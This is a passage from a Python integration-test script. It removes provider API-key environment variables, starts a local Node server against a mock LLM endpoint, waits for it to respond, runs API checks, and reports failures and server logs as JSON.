    env = {k: v for k, v in os.environ.items() if not k.startswith(("LLM_", "ANTHROPIC_", "NVIDIA_", "ELEVENLABS_", "OPENAI_", "CAMB_", "NV_LOCALIZE", "WAN_", "KIE_"))}
    srv = subprocess.Popen(["node", ROOT + "/server.js"], cwd=D, env=dict(env, PORT=str(PORT), SECRET_KEY="a" * 40, FIREBASE_PROJECT_ID="", PUBLIC_BASE_URL=f"http://localhost:{PORT}", AGENTS_AUTO_LEARN="false",
        LLM_API_KEY="mock", LLM_BASE_URL=M, LLM_MODEL="mock-text", MIRROR_MEDIA="false"), stdout=subprocess.DEVNULL, stderr=subprocess.PIPE)
    try:
        for _ in range(80):
            try: urllib.request.urlopen(f"http://localhost:{PORT}/v1/config", timeout=1); break
            except Exception: time.sleep(.25)
        api_checks()
        asyncio.run(main())
    except Exception:
        import traceback; fails.append("crash: " + traceback.format_exc()[-900:])
    finally:
        srv.terminate(); mk.terminate()
        try: err = srv.stderr.read().decode()[-1500:]
        except Exception: err = ""
    print(json.dumps({"fails": fails, "out": out, "serverLog": err if fails else ""}, ensure_ascii=False, default=str, indent=1))
    sys.exit(1 if fails else 0)
